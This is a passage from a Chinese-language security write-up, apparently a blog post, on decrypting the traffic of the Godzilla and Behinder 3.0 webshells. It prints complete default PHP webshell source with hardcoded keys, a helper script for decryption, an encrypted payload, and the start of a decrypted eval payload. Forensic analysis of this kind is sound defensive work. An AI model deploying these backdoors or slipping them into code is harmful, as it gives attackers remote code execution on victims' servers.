variable">$pass</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$payloadName</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$payload</span><span class="token operator">=</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$payloadName</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"getBasicsInfo"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token variable">$payload</span><span class="token operator">=</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token operator">.</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">encode</span><span class="token punctuation">(</span>@<span class="token function">run</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token operator">.</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"getBasicsInfo"</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$payloadName</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>即是PHP_XOR_BASE64的默认shell，至于后面key的编码和PHP_XOR_BASE64解密方法一致，可参考上面小节。</p><h3 id="PHP-XOR-RAW"><a href="#PHP-XOR-RAW" class="headerlink" title="PHP_XOR_RAW"></a>PHP_XOR_RAW</h3><p>对应的默认木马文件：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">&lt;?php@session_start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@set_time_limit<span class="token punctuation">(</span>0<span class="token punctuation">)</span><span class="token punctuation">;</span>@error_reporting<span class="token punctuation">(</span>0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> encode<span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">,</span><span class="token variable">$K</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span>=0<span class="token punctuation">;</span><span class="token variable">$i</span>&lt;strlen<span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$c</span> = <span class="token variable">$K</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">+</span>1&amp;15<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$D</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> = <span class="token variable">$D</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span>^<span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$D</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$payloadName</span>=<span class="token string">'payload'</span><span class="token punctuation">;</span><span class="token variable">$key</span>=<span class="token string">'3c6e0b8a9c15224a'</span><span class="token punctuation">;</span><span class="token variable">$data</span>=file_get_contents<span class="token punctuation">(</span><span class="token string">"php://input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$data</span><span class="token operator">!</span>==false<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$data</span>=encode<span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$payloadName</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$payload</span>=encode<span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$payloadName</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>strpos<span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">,</span><span class="token string">"getBasicsInfo"</span><span class="token punctuation">)</span>===false<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$payload</span>=encode<span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>eval<span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">echo</span> encode<span class="token punctuation">(</span>@run<span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>strpos<span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token string">"getBasicsInfo"</span><span class="token punctuation">)</span><span class="token operator">!</span>==false<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$payloadName</span><span class="token punctuation">]</span>=encode<span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里根据shell可以得到 解密过程更简单一点，但它需要提取二进制数据进行解密，直接用wireshark有点麻烦就在哥斯拉的shell里添了：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token variable">$b</span> = file_put_contents<span class="token punctuation">(</span><span class="token string">'raw.txt'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将二进制文本存了下来，然后直接读取解密：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">&lt;?php @session_start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@set_time_limit<span class="token punctuation">(</span>0<span class="token punctuation">)</span><span class="token punctuation">;</span>@error_reporting<span class="token punctuation">(</span>0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> encode<span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">,</span><span class="token variable">$K</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span>=0<span class="token punctuation">;</span><span class="token variable">$i</span>&lt;strlen<span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$c</span> = <span class="token variable">$K</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">+</span>1&amp;15<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$D</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> = <span class="token variable">$D</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span>^<span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$D</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$pass</span>=<span class="token string">'pass'</span><span class="token punctuation">;</span><span class="token variable">$payloadName</span>=<span class="token string">'payload'</span><span class="token punctuation">;</span><span class="token variable">$key</span>=<span class="token string">'3c6e0b8a9c15224a'</span><span class="token punctuation">;</span><span class="token variable">$file_path</span> = <span class="token string">"raw.txt"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>file_exists<span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$fp</span> = fopen<span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$post</span> = fread<span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> filesize<span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$post</span> = str_replace<span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$post</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">#$post = "";</span><span class="token comment">#echo base64_decode($post);</span><span class="token function">echo</span> <span class="token string">"&lt;br/&gt;"</span><span class="token punctuation">;</span><span class="token function">echo</span> <span class="token string">"&lt;br/&gt;"</span><span class="token punctuation">;</span><span class="token comment">#$data=encode(base64_decode($post),$key);</span><span class="token variable">$data</span>=encode<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="冰蝎3-0"><a href="#冰蝎3-0" class="headerlink" title="冰蝎3.0"></a>冰蝎3.0</h2><p>这里还是以php为例，默认shell如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$key</span><span class="token operator">=</span><span class="token string double-quoted-string">"a02439ec229d8be0"</span><span class="token punctuation">;</span> <span class="token comment">//该密钥为连接密码32位md5值的前16位，默认连接密码POST</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'k'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$key</span><span class="token punctuation">;</span><span class="token function">session_write_close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$post</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php://input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'openssl'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$t</span><span class="token operator">=</span><span class="token string double-quoted-string">"base64_"</span><span class="token operator">.</span><span class="token string double-quoted-string">"decode"</span><span class="token punctuation">;</span><span class="token variable">$post</span><span class="token operator">=</span><span class="token variable">$t</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token operator">.</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$post</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$post</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$key</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token variable">$post</span><span class="token operator">=</span><span class="token function">openssl_decrypt</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"AES128"</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token variable">$arr</span><span class="token operator">=</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$post</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$params</span><span class="token operator">=</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token operator">.</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>    @<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由shell可得冰蝎所进行ase加密的恶意代码，这里解密需要密钥，而密钥是由设置连接密码32位md5加密的前16位组成，整体解法并不复杂。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">2L40NUw3Mv00wTIlVK7Jz4FY4xOvRXtym/xSmP20i+wHTDZpqs0PHF7j3BzBDhZlPVbkI8iaBWjGuwdmzA8CfTOxPkH547xm5v8GyO7utOD/HuDO/LVXdKL6swAu4sGlBtEaK8FDyETSfNYiYmcfkaQYGUMTt1jjFE0EYckfjMh+9muc7UGO8K5EIGcwF8LdtuNeH0QOv2nBEarF9R53r9X2JdWfBungKXiOGVbWdNEiUTG3NU5Mlem0r+Vvsvv19HQLTtNlBPB7M8tDE0LtSktjPgt5n50+rJe3bLKMnI/aaoHNe8bcfbiLSk13Fn5D8dXwkf8vN6OaVDVq+Dn3qaCORhOSX+36YvzAgmdWWYb7e0TAAHK9UTlifPZGyCzt7DFUipMIpeEdNqdfh4TN2TSy/Dua8FiIutMA5pI9zrkC/g/OAqK3C6PsfvQOQSkoYkA3uS0/GK+oMiIplS3VLtxqtKpgS3a4IC6yHn/dZnwPpf32lzuzGfRnhOIluqXqzvLyxJC7mKhMj0IjVjztm6XKbi2Nki2DAQVh36gdHCC6by4Ut/2err6VZDrIQUrWycdZzCCu2OD1FFAZzUOiQ+<span class="token operator">+</span>PxUS2rOc5K+I2NnLgGePpj6VOmDbOibLrfrFG0nQOHXkpK4r+XKRypn21dDB7tg2N3Q8PXdmkygpGTic8dU98KA/hqog0uWoNOEVo6KbIScewGuTEvOlGiObfTPfZCW5n0oW6nonx8ljzVy1MU3MvcH6vkTNhpcUbuInyND8DMqdpi+MvfPlX0tuD9AE5G9F533u2ovGNCQroyFuFwNAu7ovUzpML1AsBaFTbdQKgo5d4YNdIBE6/kFW30b6WQMOg8cok2R+9mowbtp/4P77/ruY+mhp4Gba1cCINXeWv9rWQYr1tn2a34Pe09Z4g1vN8xjdyHE5PMs1mpAWog6eE1ZLiXSrHsT2Bj85BnZhVVlqMym6NMVm3uLCqiX0J6ul+zILAYQivDOzMxNpdCFojitJ5G3DSL5wk/U+xZoSz8mCrA2ovuaSvDknw+bBSORJv5xC8otDLV3g/5dBuAjDlOkbSD4MfL3MfdvIq6g0d807G9txdQk4/IyBtlz9HFu4LZ4bHB/3N8MmnDP1DZEfJ1zjakmHFMJMkntoda4xBsuz4C/QYykF3ctZ8azJPHmtG0ruvMPO1le1wqINkkZy2GsJDVxJV2n1Fb4NYdGxiydoU9so+NtGCPr3bbmj/AxlplfHLzzC9nJ4yOn3Su9YzYxrgpcvj6z7GPhM2b1UOWQPzNwDtgWMTXVrGtZ7JJscx00G3P7akErCmodWRyU+9Lch5FFvCxjc/48k2Dpja91Y5dqsVVJZ8FmHHN39oweIBiE6n21ShMhB4D+BW+jLK11GmlRCcrj0leZUh8pTPd0E6K/JFJMIozcolxXpa8hY8snvC9BiNdMg2ltrD0yj64eqvTMBWJqYY3oMckenhix/fUEX7jCMABsiUWDeYrf/ds4i1NWxcAnnARcTnVoqLIaSzd9CUTmUdQrfVJbZ2ghTqsY0qQ8dVteGcXyD8ehMf1ClgKDx0akUcVMzJfQRiX2X1Uv5RRuC64hGuRo2wMn0uKqZqMSU1Yf1KiDw5R/m0hZjB30+8Cr6d+RCxp2bPWvdXrPrJasCHhhqx7kHi/RPqjO0rpl/y01pK5MVe6AUBZoGcsFwzML911PdtdXAEjPaFZqAu829efqTMS9wDBO7F4n+l93rgsdEY0ejrq/R/jbhprzReX/8tvGRPAzSFd6OS+BKAZYZ3PcMGcGTp4v1/SnM/DVx1B6sOpztsQ65ZzDPWa+iudfxdhiKlY+smt2uJCC413enKyGwJ+X+PtkS1yBB0im+xNuCOrC7Qn72Q2TW/VjQmHaPpQVoLLJ5cIorBLnLxlk63dZsd4to5+xISEru4utDoART3MS+IRgxVe1af89yerrVdyO+<span class="token operator">/</span>6IVNLz/N9alZ2i1LRnAiY5FovPB+IJjo0xNqqEiGCF3B2hEl9/C9XaXbk5lVi/JhGcA5r0CNgn4i6ROqL8fgrqbZ0h53hf9TAotoTV9B9NiufGDxn/slXDu1km6Oqd1YA/EKrKLTlNkd0GKvWBEnYEqx+82eJ8yTUTRWPyl63jh6kgNKHbqU+e840JF1bOMy5+JBuH9jhrSak8HVdU9j4ey3A6tldMKagq1s8swjcXmMsVB3LNoMJN90/k0TTRj9oM2VYLz1eknBKtxR8g3Nnrpo4KOrk2C1mrsFoPoptJgocyX9YQMUyrVx9qPRvjRggJnV2ANWO4mLze1rHGPAAMLG8Wof8sgNSp4UbOqd9aykJ87JUXtn1X3TT6WDmFZPrYWf7uzJ63AIfOKn9ZSs0DTfLOJGsHEqzWP2rWG1aH/CnEb0HBF6bov2qhwUSg6W77NhEuqYZ/X8pbfbDzRBU/IZTUidvIxQFLSOSp8bYB08ROeIhtFF9CDKb3mcwIbP/AL5bQ+PD1I5LZ/Nrmp5jXs3AI+WTn/SBjsaai9JayciOON4gOJtuXW5W/xDAWpT3qhOW0CmEX2/C0fyadgIVXDrNcQ8QCANuvMc3v1yUiDbijCPya14rx/5SoWqHsusPm9LbdNcTDBPkP/fE2Mvo81iQP0iQy7hIExPOb1gBSh2KcJsSeruRO65/PUx+<span class="token operator">/</span>JLezWee4eRWwH/7uRzQY7q+mrYlBj0vCIckMiPp5CR9oeUs4gdlxhqL4ObV9y8F5dckigcm7RVs2gRU7HT4BHxtfuf6mRwO99ocrSvlcBz0aTDmVdQ7dQMSzfhgPhCqtSQSpeohbwFQYUYAKIJppOX7cxhXJmaZJA4ykzRZN/nimUCkUEZEBystBfve6ZXNSgQTR7jU14q9w+Fq4nG+11Q/EmdqWoZ615gZ0ANGAugixjJZ+9mHRlphfzyJo8c/d4U1nNkzx/D1Tk6WDarwdicqMEGlkxQC8swqvndAYAUTedIpKVnkRu+TBPoDvbBvb2XQgLV/LvcZXSqKbWQ0Lm0u7ZW5GwT4ZNIoPpaxrCMCe0TcpR8+OtJWhaiCk4RDG9eEiNENmZVCLDSjK1q19i4051UVVjWQtY+hh7tWkxAWu/eSTSQsbP9m5ddPF4yCltClHP040G5fGIB23sSrlHGQnLIFoXMURB6hMjKL0S8m4AAIDwyLvjdlQ/K4HjHA48tcAWFQMSus4oO4uFouP4kiQi19ucpjq7uilBWbe8ktWebTz8ZyHNi+MQjdpD2vSWh4SL7rALJFqXShjOCJPWlpTqa5Y08JdfxlyFldZhWyo6IoEwXMxj08QOEo+sIkOVmmwUbMuiZ88OWlflnHcbcO8mfMB0r0RNPs16F9fb4VV596GzMpKIqiHvrz8BI0PRPhcbDtpaeQyD8AHRHMHzLcf3g1V9Fwpt4EgIvnPd3qrn4BiYjcbm9+t8bDyP905zyX8HeRskCbv/De7DzeuiTa2WIj4ERKkG+P7zePkTScnYUWITcnG3Ui63rfsgM4pV1omtrIPmV2oGunCAFO1uTQHYu4Z9u64Gs/fBoRAO7oM+AnXywoNIjl8Hx3AivGnciwhuxJm1mCFHkdnNLjU7yGKkuX6UoX4+QKkUroX/gg04b9Z4Vzm2WsQMfGO5VAVRbEOj61FrQlyCM+oYSO2A9aL74BlM972BYqqlGb8nLLKyBPpGrfwsPDR2mTZdz1sRSsRI2ItXR7wZjikxHCsVKsxgJGCna9iHiW6DZ5aIuhbUIhrVUVh8ws42qi3FyInGGBXTZU2EmETOzBBuiWBe+5gSQVRJ6nRe2ZsVhQoZJzJ1K6p6rae2Kp4wRD15kEN02kZZztuQGW9Lo2mPieZqRGFxWHiDy+nDTM1up1lCrDM5aoTPWS7G2efBwEj3uWigrPoc/6uzsbnMZa/pInWnXa3xGUca8X1gf3Rp1djsTpkyAjFVAMih6nGvemcoJCEINvne/Aq/ecvW+rP9TBkr/rXIrnaJjNHPCeYNOjl/C+LV+3EGJ/nBwsvbbb0+LpAS0uUjU2lszk3uPb9dsm29w1ZZoiku56Ab4h4wON/XHZ2z7qbRV4g4ISEcNTJdtqj0+D1fEIt4wClabVTgjTSId+4qkkv/OafZKxm8TqMXGxRMDpMSZdP3E8XOmck+MO4VMkabinj3F+yYLWD4IU20tJNKQ08Idz5SQ/<span class="token operator">/</span>E5YCofQYtSEzefMB0BSXxYxU57/Sz3noBaW2w12m74eFQr97nfwQX9JY/qudbrtwVZd1cJjAUEzd5wdb35T24t0AQGkvQAGCpZlIu0k33N6rNXOYXKeE8cDx+gnzwcGOOGxqvhrTPXP8NciPOKNv/5j0SMT0f4FBnNinaeRTX5IFseh4CO9OrO4xk8cI56o76BJFra8bUWqBEO83z37yD8cVk9XthxXYaHKmZur2AOuBpRBnmQqv36WvKRCReEfKiiYLGCrr1VJpEKrRWDESBvYxRU5IGM2hpcKqRo3+NwpwZsUdhIar6xQrEuWssOk41XuA1CyMpir8Re2LgaJIIRmk3N7mkvgr5/T8p8dFgZVdY1zOndkDOnQjGaKNJcmCYPt20+hXDo1dzVCPC3gDCtlbABSk2HNfwhOAGzrF+iInJCz1vOsFfM4ZyMz8v7b5E9S7559A11uAr4Z3crYz8fArkfnW7RV4w5JMSPVAltoecdujNYwsoL7+Qbb7X4EaYLpcrRLKrsUg7mXX7cc3GhAB4Wh7tqLFQw4CbMaKvmweImDdRelY3r5TjxCCROAfMTRGGiRhlopX7yw8CF+5c1cAR6PPJaMYSSztRRCok+cOkhD4pLeUEgRCuafwMQB350BfspEYONdr6Z7+hLgYNNEJa9cg4X7PKNB7OBwJ+<span class="token operator">/</span><span class="token operator">/</span>R/fFNG4xf3L5miXeJY2JaiHuA7duJH6kUpBfGq7jS+knRz/8azOc2n9TH/8J74h6wr8kHdStHAPgA7wetx+tqL4Y6CUGM3Hwuv4VpB2ZgQv/427BYRQ41nrPhMhYnAfFqIMpb1QfyLfB199FTzOkTYb20jHZolby3ZQUrWp5G2WOUmdg6/CNOoABPQWLJbiEurOQK7cR35pGr5XEix0UpfI3BvR8z+fGNAwxbVWAT/A3ZK1KLllQdkAJt8x+nUShictq2xUmZN3PPCaBtpSYDFrGdPAp+Gof69u2Eb6WH89pxNhA53tAWHUi2+0ExN4g/ZJUjfAtZqICWQKdCcmEaBkh/6v7mFqMmHon4THlcabBobb+Lp7EO6IntTWVrCdx4+oMpoEQKq5TZd0IIGEmxSJrrwel6r/gorqY0NTCE2i0yQ0MHxdgGQj6/ZA5+8Ani6/AMkeNF7DGeozFr53NycnWO6wFeXmoBeJ2w2Hmj0RVecPwU809v+hOxL45Tn6g9ZSSG7hFZJkUVjD0NO3u3hhcN65wbPsILHJZpTo/KiocBy2S1+j747iMfzKmgmqsBcI1y+Vx3C/5Km2rsaagSSxXQx1eqTF3Y07Aq4h5SJp5x3eHm50WCC2Iyh7Vb37+a9jrFu76U+1AiwMM8pYCLWIxrYbcU/wo2eLnpWlRnGEUrtijjdrwegXDCAiEqvhqp11DUU3KUy5UwfcPZeeMo5a5T32TVbWDX2eyMCNXMyx5UzCpspxh4Qj+SWgaXswoIab5Gx5rq7h8lJNL9P2/js0D7VgO1AwdeUI8RmsK1TygwQBGHu92S2/PR1YTzQ3dB5U9mwLM2nUxi0U0BrHI/4hh/Ilpw4msZNk69IlpXcfNyPvVFKxZaU=<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ASE加密模式CBC，填充：okcs7padding，密钥长度：128位，密钥：a02439ec229d8be0：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">Pssert<span class="token punctuation">|</span>eval<span class="token punctuation">(</span>base64_decode<span class="token punctuation">(</span><span class="token 